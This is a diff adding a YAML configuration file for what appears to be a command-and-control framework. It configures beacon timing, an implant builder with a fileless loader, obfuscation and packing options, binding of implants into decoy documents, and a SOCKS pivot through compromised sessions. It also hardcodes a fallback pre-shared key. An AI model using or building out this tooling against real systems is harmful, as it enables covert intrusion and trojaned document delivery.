@@ -1,0 +1,31 @@
+server:
+  host: 0.0.0.0
+  port: 8000
+  tls:
+    enabled: false        # true when serving TLS directly (Coolify/Traefik -> false)
+    cert: certs/server.crt
+    key: certs/server.key
+
+# set PHANTOM_PSK in prod; the value here is the fallback
+psk_hex: "9f2c1e7a4b6d8035c1a94f2e7b0d6c3a5e8f1b2d4c7a9036e5f8b1c2d4a70639"
+
+beacon:
+  default_sleep: 3
+  default_jitter: 20
+
+builder:
+  go_bin: go
+  implant_dir: ../implant
+  stub_dir: stub
+  output_dir: ./builds
+  loader_template: ../fileless/loader.tpl
+  public_url: ""          # empty -> auto-detect from the dashboard request
+  garble: false           # obfuscate identifiers if garble is installed
+  upx: false              # compress binaries if upx is installed
+  max_bind_size: 67108864 # 64 MB decoy document cap
+
+socks:
+  host: 127.0.0.1
+  port: 1080
+  enabled: true
+  session: ""             # pin to a specific session id, or leave empty to auto-pick
